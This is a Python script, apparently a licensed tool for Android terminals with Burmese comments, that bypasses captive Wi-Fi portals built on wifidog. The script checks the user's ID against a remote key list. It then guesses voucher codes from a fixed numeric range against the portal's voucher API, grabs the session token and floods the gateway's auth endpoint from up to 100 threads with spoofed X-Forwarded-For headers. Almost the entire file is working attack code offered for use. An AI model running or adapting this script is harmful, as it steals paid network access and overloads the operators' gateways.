import requests, re, urllib3, time, threading, os, random, subprocess, json, sys
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- ID စစ်မယ့် Link (Koclay.txt နဲ့ ချိတ်ထားသည်) ---
VIP_URL = "https://raw.githubusercontent.com/painglintun895-rgb/my-keys/main/Koclay.txt"
CACHE_FILE = ".kc_cache.json"
USER_NAME, EXP_DATE, AUTHORIZED = "Me", "--", False

# Voucher ကုဒ် ၁၀၀ (ဆရာကြီး စိတ်ကြိုက် ပြင်နိုင်ပါတယ်)
VOUCHER_LIST = [str(i) for i in range(123400, 123501)] # ၁၂၃၄၀၀ မှ ၁၂၃၅၀၀ အထိ ၁၀၁ ခု

def get_uid():
    try: return subprocess.check_output(['whoami']).decode('utf-8').strip()
    except: return "u0_a232"

def update_status():
    global USER_NAME, EXP_DATE, AUTHORIZED
    uid = get_uid()
    # Cache စစ်ဆေးခြင်း
    if os.path.exists(CACHE_FILE):
        try:
            with open(CACHE_FILE, 'r') as f:
                data = json.load(f)
                if data.get("status") == "expired": sys.exit()
                USER_NAME, EXP_DATE, AUTHORIZED = data['u'], data['e'], True
        except: pass
    try:
        res = requests.get(f"{VIP_URL}?cb={random.random()}", timeout=7)
        if res.status_code == 200:
            found = False
            for line in res.text.splitlines():
                if uid in line:
                    parts = line.split('|')
                    v_name, exp_dt = parts[1].strip(), parts[2].strip()
                    # ရက်ကုန်မကုန် စစ်ဆေးခြင်း
                    if datetime.strptime(exp_dt, '%Y-%m-%d') < datetime.now():
                        with open(CACHE_FILE, 'w') as f:
                            json.dump({"u": v_name, "e": exp_dt, "status": "expired"}, f)
                        print("\033[91m[!] Your ID Expired! Contact Admin.\033[0m")
                        sys.exit()
                    # Cache သိမ်းဆည်းခြင်း
                    with open(CACHE_FILE, 'w') as f:
                        json.dump({"u": v_name, "e": exp_dt, "status": "active"}, f)
                    USER_NAME, EXP_DATE, AUTHORIZED = v_name, exp_dt, True
                    found = True; break
            if not found and not AUTHORIZED: 
                print("\033[91m[!] ID Not Authorized. Register First!\033[0m")
                sys.exit()
    except:
        if not AUTHORIZED: sys.exit()

def banner():
    os.system('clear')
    print("\033[93m" + " ="*38)
    print("\033[96m" + """
     ██╗  ██╗ ██████╗  ██████╗██╗      █████╗ ██╗   ██╗
     ██║ ██╔╝██╔═══██╗██╔════╝██║     ██╔══██╗╚██╗ ██╔╝
     █████╔╝ ██║   ██║██║     ██║     ███████║ ╚████╔╝ 
     ██╔═██╗ ██║   ██║██║     ██║     ██╔══██║  ╚██╔╝  
     ██║  ██╗╚██████╔╝╚██████╗███████╗██║  ██║   ██║   
     ╚═╝  ╚═╝ ╚═════╝  ╚═════╝╚══════╝╚═╝  ╚═╝   ╚═╝   """)
    print(f"\033[95m 👑 KC-USER: {USER_NAME} | \033[92m📅 EXP: {EXP_DATE} | \033[94m🆔: {get_uid()}")
    print("\033[93m ="*38 + "\033[0m")

def turbo_pulse(link, mode):
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Connection": "keep-alive",
        "X-Forwarded-For": f"192.168.{random.randint(1,200)}.{random.randint(1,200)}"
    }
    while True:
        try:
            requests.get(link, timeout=5, verify=False, headers=headers)
            print(f"\033[92m[✓] 👑 KoＣＬＡＹ 👑 | Pulse OK >>> [{random.randint(20,50)}ms]\033[0m")
            # Mode 1 (Turbo) ဆိုရင် 0.02s နားမယ်၊ Mode 2 ဆိုရင် 0.08s နားမယ် (ဖုန်းမပူအောင်)
            delay = 0.02 if mode == "1" else 0.08
            time.sleep(delay)
        except:
            time.sleep(1)

def launch():
    update_status()
    banner()
    print("\n\033[93m [ Choose Mode ]")
    print("\033[92m [1] 🚀 KC-Turbo (100 Threads - High Performance)")
    print("\033[94m [2] 🔋 KC-Eco (50 Threads - Battery Save Mode)")
    choice = input("\033[97m\n [?] Select (1/2): ")
    
    thread_count = 100 if choice == "1" else 50
    banner()
    print(f"\033[95m[*] Stabilizing Connection: {thread_count} Threads Activated...")
    
    session = requests.Session()
    while True:
        try:
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            p_url = r.url
            gw = parse_qs(urlparse(p_url).query).get('gw_address', [urlparse(p_url).netloc.split(':')[0]])[0]
            port = parse_qs(urlparse(p_url).query).get('gw_port', ['2060'])[0]
            
            r1 = session.get(p_url, verify=False, timeout=6)
            m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            n_url = urljoin(p_url, m.group(1)) if m else p_url
            r2 = session.get(n_url, verify=False, timeout=6)
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            
            if sid:
                # Voucher လှည့်သုံးခြင်း
                v_code = random.choice(VOUCHER_LIST)
                p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
                session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': v_code, 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                
                auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
                print(f"\033[95m[*] ⚡ KC.PY BYPASS SUCCESS [Code: {v_code}] ⚡\033[0m")
                
                for _ in range(thread_count):
                    threading.Thread(target=turbo_pulse, args=(auth_link, choice), daemon=True).start()
                
                # လိုင်းမပြတ်စေရန် ၂ စက္ကန့်တစ်ခါ အမြဲ စစ်ဆေးခြင်း
                while True:
                    time.sleep(2)
                    try:
                        check = requests.get("http://www.google.com/generate_204", timeout=3)
                        if check.status_code != 204: break
                    except: break
            time.sleep(2)
        except: time.sleep(2)

if __name__ == "__main__":
    launch()

